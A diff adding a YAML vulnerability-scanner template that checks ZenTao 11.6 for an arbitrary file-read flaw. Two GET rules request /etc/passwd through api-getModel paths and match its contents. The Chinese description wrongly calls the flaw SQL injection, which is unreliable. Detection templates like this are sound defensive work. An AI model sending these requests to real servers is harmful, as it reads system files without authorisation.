@@ -1,0 +1,24 @@
+id: zentao-api-getmodel-api-fileread
+
+info:
+  name: 禅道 11.6 Api getModel api getMethod filePath 任意文件读取漏洞
+  author: daffainfo
+  severity: critical
+  description: |
+    禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 icon_hash="53755730"
+    fofa: app="禅道-11.6"
+  tags: zentao,v11.6,fileread
+  created: 2025/03/13
+
+rules:
+  Linux0:
+    request:
+      method: GET
+      path: /api-getModel-file-parseCSV-fileName=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  Linux1:
+    request:
+      method: GET
+      path: /api-getModel-api-getMethod-filePath=/etc/passwd/1
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: Linux0() || Linux1()
